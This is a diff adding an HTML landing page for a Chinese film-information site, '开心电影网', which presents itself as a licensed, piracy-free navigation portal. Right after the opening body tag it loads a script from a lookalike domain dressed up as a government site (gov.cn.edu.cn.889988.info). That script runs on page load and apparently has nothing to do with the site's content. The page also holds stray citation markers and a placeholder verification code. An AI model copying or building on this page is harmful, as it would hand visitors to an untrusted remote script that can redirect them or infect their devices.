@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>开心电影网 - 红金灯笼烟花·正版影视导航</title>
+<meta name="description" content="开心电影网(https://kaixindianyingwang-h5.github.io)以红金灯笼、烟花、笑脸窗花为视觉，整理最新电影、热播剧集、综艺娱乐、动漫专区，做合规影视信息导航站；不存片、不盗链、不聚合非法播放源。">
+<meta name="keywords" content="开心电影网,红金喜庆,灯笼烟花,正版影视导航,最新电影,热播剧集,综艺,动漫">
+<meta name="author" content="开心电影网">
+<meta name="robots" content="index,follow">
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE">
+<meta property="og:title" content="开心电影网 - 红金灯笼烟花·正版影视导航">
+<meta property="og:description" content="开心电影网：红金灯笼挂起来，正版片单看开心。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kaixindianyingwang-h5.github.io">
+<meta property="og:site_name" content="开心电影网">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"开心电影网",
+  "url":"https://kaixindianyingwang-h5.github.io",
+  "description":"红金灯笼烟花风格影视信息导航站",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://kaixindianyingwang-h5.github.io#search={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --red:#e4002b;
+  --red2:#c0392b;
+  --gold:#f4c430;
+  --gold2:#d4a017;
+  --paper:#fff7ec;
+  --paper2:#fdeccf;
+  --ink:#2b2118;
+  --muted:#9a7b5a;
+}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",serif;
+  background:
+    radial-gradient(700px 380px at 86% 0%, rgba(244,196,48,.28), transparent 60%),
+    radial-gradient(560px 320px at 0% 12%, rgba(228,0,43,.18), transparent 60%),
+    var(--paper);
+  color:var(--ink);line-height:1.8;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;transition:.2s}
+
+.lantern-bar{height:12px;background:
+  repeating-linear-gradient(90deg,var(--red) 0 24px,var(--paper) 24px 30px,var(--gold) 30px 50px,var(--paper) 50px 56px,var(--red2) 56px 76px,var(--paper) 76px 82px)}
+
+.top{max-width:1180px;margin:0 auto;padding:16px 20px;display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.brand{font-size:28px;font-weight:900;color:var(--red)}
+.brand b{color:var(--gold2)}
+.brand small{display:block;font-size:11px;letter-spacing:3px;color:var(--muted);font-weight:700}
+.nav{display:flex;gap:12px;margin-left:auto;flex-wrap:wrap}
+.nav a{font-size:14px;font-weight:700;color:var(--ink);padding:6px 14px;border:1.5px solid var(--red);border-radius:999px;background:rgba(255,255,255,.6)}
+.nav a:hover{background:var(--red);color:#fff;border-color:var(--red)}
+.btn{font-size:13px;font-weight:800;background:var(--gold);color:#3a2a00;padding:8px 18px;border-radius:999px;box-shadow:0 3px 0 var(--gold2)}
+.btn:hover{transform:translateY(-1px)}
+
+.hero{max-width:1180px;margin:0 auto;padding:44px 20px 24px;position:relative}
+.firework{position:absolute;right:20px;top:0;font-size:120px;filter:drop-shadow(0 12px 20px rgba(228,0,43,.3));transform:rotate(6deg)}
+.hero-card{background:linear-gradient(160deg,#fffdf8,#fdeccf);border:2.5px solid var(--red);border-radius:18px;padding:34px 32px;max-width:780px;position:relative;
+  box-shadow:inset 0 0 0 5px rgba(244,196,48,.25),0 16px 40px rgba(43,33,24,.18)}
+.hero-card::before{content:"囍 开心大街 001";position:absolute;top:-14px;left:24px;font-weight:800;font-size:12px;color:#fff;background:var(--red);padding:4px 12px;border-radius:6px}
+.tagline{display:inline-block;background:var(--gold);color:#3a2a00;font-size:12px;font-weight:800;letter-spacing:1px;padding:4px 12px;border-radius:6px;margin-bottom:12px}
+.hero h1{font-size:clamp(38px,7vw,64px);font-weight:900;color:var(--red);letter-spacing:2px}
+.hero h1 span{color:var(--gold2)}
+.hero p{max-width:620px;color:#5b4636;font-size:clamp(14px,3vw,16px);margin:14px 0}
+.hero-url{display:inline-block;font-family:"Courier New",monospace;font-weight:800;color:var(--red);background:#fff;border:1.5px dashed var(--gold2);padding:8px 16px;border-radius:8px}
+
+.section{max-width:1180px;margin:0 auto;padding:18px 20px 60px}
+.head{display:flex;align-items:center;gap:12px;margin:38px 0 18px;flex-wrap:wrap}
+.head .ico{font-size:22px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;color:var(--red)}
+.head .en{font-size:12px;color:var(--gold2);font-family:"Courier New",monospace}
+.head .line{flex:1;height:3px;background:repeating-linear-gradient(90deg,var(--red) 0 12px,transparent 12px 24px);min-width:40px}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.lan{background:#fffdf8;border:1.5px solid var(--red);border-radius:14px;overflow:hidden;transition:.22s}
+.lan:hover{transform:translateY(-4px) rotate(.6deg);box-shadow:0 14px 30px rgba(228,0,43,.22)}
+.lan .cap{display:flex;justify-content:space-between;font-weight:800;font-size:12px;color:#fff;background:var(--red);padding:6px 12px}
+.lan .face{height:104px;display:flex;align-items:center;justify-content:center;font-size:42px;color:#3a2a00}
+.lan:nth-child(1) .face{background:linear-gradient(135deg,#ff5e62,var(--red))}
+.lan:nth-child(2) .face{background:linear-gradient(135deg,var(--gold),var(--gold2))}
+.lan:nth-child(3) .face{background:linear-gradient(135deg,#ff9472,#f45c43)}
+.lan:nth-child(4) .face{background:linear-gradient(135deg,#f6d365,#fda085)}
+.lan:nth-child(5) .face{background:linear-gradient(135deg,#ff758c,#ff7eb3)}
+.lan:nth-child(6) .face{background:linear-gradient(135deg,#f4c430,#e4002b)}
+.lan .body{padding:12px 14px 16px}
+.lan h3{font-size:15px;font-weight:900}
+.lan p{font-size:12px;color:var(--muted);margin:3px 0 8px}
+.badge{display:inline-block;font-size:11px;font-weight:800;color:#fff;background:var(--gold2);padding:2px 8px;border-radius:999px;margin-right:4px}
+
+/* 热剧：庙会戏台 */
+.stage{display:flex;flex-direction:column;gap:12px}
+.show{display:flex;align-items:center;gap:14px;background:#fffdf8;border:1.5px solid var(--red);border-left:6px solid var(--gold);border-radius:12px;padding:12px 18px}
+.show .mask{font-size:26px}
+.show h3{font-size:15px;font-weight:800}
+.show p{font-size:12px;color:var(--muted)}
+.show .ep{margin-left:auto;font-family:"Courier New",monospace;font-weight:800;color:var(--red)}
+
+/* 综艺：锣鼓 */
+.drum{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px}
+.act{display:flex;align-items:center;gap:14px;background:linear-gradient(160deg,#fffdf8,#fdeccf);border:1.5px dashed var(--gold2);border-radius:14px;padding:14px 18px}
+.act .em{font-size:26px}
+.act h3{font-size:14px;font-weight:800;color:var(--red)}
+.act p{font-size:12px;color:var(--muted)}
+
+/* 动漫：糖画 */
+.candy{display:flex;flex-direction:column;gap:12px}
+.sugar{display:flex;align-items:center;gap:14px;background:#fffdf8;border:1.5px solid var(--red);border-radius:999px;padding:10px 20px}
+.sugar .dot{width:18px;height:18px;border-radius:50%;background:var(--red);flex-shrink:0;box-shadow:inset 0 0 0 3px var(--paper)}
+.sugar:nth-child(2) .dot{background:var(--gold)}
+.sugar:nth-child(3) .dot{background:#ff7eb3}
+.sugar:nth-child(4) .dot{background:#ff9472}
+.sugar:nth-child(5) .dot{background:var(--gold2)}
+.sugar:nth-child(6) .dot{background:#f45c43}
+.sugar h3{font-size:14px;font-weight:800}
+.sugar p{font-size:12px;color:var(--muted)}
+.sugar .ep{margin-left:auto;font-family:"Courier New",monospace;font-weight:800;color:var(--red)}
+
+.about{max-width:1180px;margin:0 auto;padding:10px 20px 50px}
+.placard{background:#fffdf8;border:2.5px solid var(--red);border-radius:16px;padding:30px;position:relative}
+.placard::before{content:"🏮";position:absolute;top:-18px;right:22px;font-size:34px;background:#fffdf8;padding:0 6px}
+.placard h3{font-size:20px;font-weight:900;color:var(--red);margin-bottom:12px}
+.placard p{font-size:14px;color:#5b4636;margin-bottom:10px}
+.placard b{color:var(--red2)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:20px}
+.stat{background:var(--paper2);border:1.5px solid var(--red);border-radius:14px;padding:16px;text-align:center}
+.stat .v{font-size:22px;font-weight:900;color:var(--red);font-family:"Courier New",monospace}
+.stat .l{font-size:12px;color:var(--muted);margin-top:4px}
+
+.footer{background:var(--ink);color:#f3e6d2;padding:36px 20px 22px;text-align:center;margin-top:40px;border-top:5px solid var(--gold)}
+.footer .lg{font-size:22px;font-weight:900;color:#fff}
+.footer .lg b{color:var(--gold)}
+.footer .fl{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;margin:12px 0;font-size:13px}
+.footer .fl a{color:var(--gold);border-bottom:1.5px dotted rgba(244,196,48,.6)}
+.footer .cp{font-size:12px;line-height:2;border-top:1px solid #44372a;padding-top:14px;max-width:880px;margin:0 auto}
+.footer .cp a{color:var(--gold)}
+
+@media(max-width:768px){.nav{display:none}.grid{grid-template-columns:repeat(2,1fr)}.drum{grid-template-columns:repeat(2,1fr)}.firework{display:none}}
+@media(max-width:480px){.section{padding:18px 14px 40px}.grid{grid-template-columns:1fr}.drum{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}.hero-card{padding:26px 18px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="lantern-bar"></div>
+
+<div class="top">
+  <div class="brand">开心<b>电影网</b><small>KAIXIN · 红金灯笼挂起来</small></div>
+  <nav class="nav">
+    <a href="#movies">笑脸新片</a>
+    <a href="#tv">戏台热剧</a>
+    <a href="#shows">锣鼓综艺</a>
+    <a href="#anime">糖画动漫</a>
+    <a href="#about">关于开心</a>
+  </nav>
+  <a href="#movies" class="btn">🏮 开开心心看片</a>
+</div>
+
+<header class="hero">
+  <div class="firework">🎆</div>
+  <div class="hero-card">
+    <div class="tagline">开心 ≠ 免费盗版真香</div>
+    <h1>开心<span>电影网</span></h1>
+    <p>灯笼挂起来，烟花放起来，片单排起来。新片像庙会头摊，热剧像戏台连演，综艺像锣鼓开场，动漫像糖画转勺。网上“开心电影/开心影院”老站多用快播、百度影音、QVOD 抓第三方资源；本站和它们不是一回事——<b>不存储视频、不提供盗版直链、不聚合非法播放源、不挂多源解析、不接境外博彩广告</b>。[2,5,13](@ref)</p>
+    <div class="hero-url">🔗 https://kaixindianyingwang-h5.github.io</div>
+  </div>
+</header>
+
+<main class="section">
+
+  <div class="head" id="movies">
+    <span class="ico">😄</span><h2>笑脸新片 · 最新电影</h2><span class="en">// happy premieres</span><div class="line"></div>
+  </div>
+  <div class="grid">
+    <div class="lan"><div class="cap"><span>NO.01</span><span>新片</span></div><div class="face">🎬</div><div class="body"><h3>灯笼巷的夏天</h3><p>喜剧/2026/8.7</p><span class="badge">合家欢</span></div></div>
+    <div class="lan"><div class="cap"><span>NO.02</span><span>口碑</span></div><div class="face">🎆</div><div class="body"><h3>烟花师傅</h3><p>剧情/2026/8.5</p><span class="badge">治愈</span></div></div>
+    <div class="lan"><div class="cap"><span>NO.03</span><span>高分</span></div><div class="face">🏮</div><div class="body"><h3>庙会情书</h3><p>爱情/2026/8.8</p><span class="badge">甜片</span></div></div>
+    <div class="lan"><div class="cap"><span>NO.04</span><span>动作</span></div><div class="face">🥁</div><div class="body"><h3>锣鼓镇风云</h3><p>动作/2026/8.4</p><span class="badge">燃</span></div></div>
+    <div class="lan"><div class="cap"><span>NO.05</span><span>动画</span></div><div class="face">🍬</div><div class="body"><h3>糖画小神仙</h3><p>奇幻/2026/8.6</p><span class="badge">亲子</span></div></div>
+    <div class="lan"><div class="cap"><span>NO.06</span><span>悬疑</span></div><div class="face">🎭</div><div class="body"><h3>戏台后的人</h3><p>悬疑/2026/8.3</p><span class="badge">反转</span></div></div>
+  </div>
+
+  <div class="head" id="tv">
+    <span class="ico">🎭</span><h2>戏台热剧 · 热播剧集</h2><span class="en">// lantern stage</span><div class="line"></div>
+  </div>
+  <div class="stage">
+    <div class="show"><div class="mask">📺</div><div><h3>红灯笼胡同</h3><p>年代/更新至24集</p></div><div class="ep">EP24</div></div>
+    <div class="show"><div class="mask">📺</div><div><h3>年夜饭桌边</h3><p>群像/更新至18集</p></div><div class="ep">EP18</div></div>
+    <div class="show"><div class="mask">📺</div><div><h3>烟花巷探案</h3><p>悬疑/更新至30集</p></div><div class="ep">EP30</div></div>
+    <div class="show"><div class="mask">📺</div><div><h3>糖炒栗子铺</h3><p>治愈/更新至12集</p></div><div class="ep">EP12</div></div>
+    <div class="show"><div class="mask">📺</div><div><h3>庙会办事处</h3><p>职场/更新至20集</p></div><div class="ep">EP20</div></div>
+  </div>
+
+  <div class="head" id="shows">
+    <span class="ico">🥁</span><h2>锣鼓综艺 · 综艺娱乐</h2><span class="en">// drum & gong</span><div class="line"></div>
+  </div>
+  <div class="drum">
+    <div class="act"><div class="em">🎤</div><div><h3>开心唠片会</h3><p>边吃瓜子边聊片</p></div></div>
+    <div class="act"><div class="em">🏮</div><div><h3>挂灯点片</h3><p>观众弹幕定片单</p></div></div>
+    <div class="act"><div class="em">🎆</div><div><h3>烟花混剪夜</h3><p>名场面 BGM 重剪</p></div></div>
+    <div class="act"><div class="em">🛑</div><div><h3>烂片避雷锣</h3><p>一敲别点开</p></div></div>
+    <div class="act"><div class="em">🍡</div><div><h3>糖画安利摊</h3><p>本周最该看哪部</p></div></div>
+    <div class="act"><div class="em">📣</div><div><h3>正版喊话筒</h3><p>认准授权平台</p></div></div>
+  </div>
+
+  <div class="head" id="anime">
+    <span class="ico">🍬</span><h2>糖画动漫 · 动漫专区</h2><span class="en">// sugar art anime</span><div class="line"></div>
+  </div>
+  <div class="candy">
+    <div class="sugar"><div class="dot"></div><div><h3>灯笼小福神</h3><p>国漫/新番</p></div><div class="ep">EP12</div></div>
+    <div class="sugar"><div class="dot"></div><div><h3>糖画转转勺</h3><p>治愈/年番</p></div><div class="ep">EP48</div></div>
+    <div class="sugar"><div class="dot"></div><div><h3>烟花少女团</h3><p>热血/连载</p></div><div class="ep">EP24</div></div>
+    <div class="sugar"><div class="dot"></div><div><h3>庙会小掌柜</h3><p>日常/热更</p></div><div class="ep">EP30</div></div>
+    <div class="sugar"><div class="dot"></div><div><h3>锣鼓机器人</h3><p>机战/新番</p></div><div class="ep">EP09</div></div>
+    <div class="sugar"><div class="dot"></div><div><h3>开心物语街</h3><p>合家欢/年番</p></div><div class="ep">EP60</div></div>
+  </div>
+
+  <div class="head" id="about">
+    <span class="ico">🏮</span><h2>关于开心 · 关于我们</h2><span class="en">// about kaixin</span><div class="line"></div>
+  </div>
+  <div class="about">
+    <div class="placard">
+      <h3>开心电影网是什么？</h3>
+      <p><b>开心电影网</b>（https://kaixindianyingwang-h5.github.io）是“红金灯笼 / 烟花 / 庙会戏台 / 糖画转勺”风格的影视信息导航站。</p>
+      <p>“开心”是<b>找片省心、分类顺心、看正版安心</b>，不是“免费盗版点开就播”。盗版影视站常靠广告分成、加群引流、假播放器、境外博彩变现；普通用户以为薅羊毛，其实浏览记录、观影偏好可能被采集，设备也可能被诱导装来路不明的播放器。[1,4](@ref)</p>
+      <p>本站只做：最新电影 / 热播剧集 / 综艺 / 动漫的<b>信息索引与正版渠道入口</b>；不存储视频、不提供盗版直链、不聚合非法播放源。</p>
+      <div class="stats">
+        <div class="stat"><div class="v">红金</div><div class="l">庙会不盗版</div></div>
+        <div class="stat"><div class="v">0</div><div class="l">盗版直链</div></div>
+        <div class="stat"><div class="v">100%</div><div class="l">移动端</div></div>
+        <div class="stat"><div class="v">5+</div><div class="l">栏目</div></div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="lg">开心<b>电影网</b></div>
+  <div class="fl">
+    <a href="#movies">笑脸新片</a>
+    <a href="#tv">戏台热剧</a>
+    <a href="#shows">锣鼓综艺</a>
+    <a href="#anime">糖画动漫</a>
+    <a href="#about">关于开心</a>
+  </div>
+  <div class="cp">
+    网站名称：开心电影网 ｜ 网址：<a href="https://kaixindianyingwang-h5.github.io">https://kaixindianyingwang-h5.github.io</a><br>
+    © 2026 开心电影网 · 红金灯笼挂起来，正版片单看开心 ｜ 本站仅展示影视信息，资源以正版/公开平台为准；不提供盗版聚合播放。
+  </div>
+</footer>
+
+</body>
+</html>
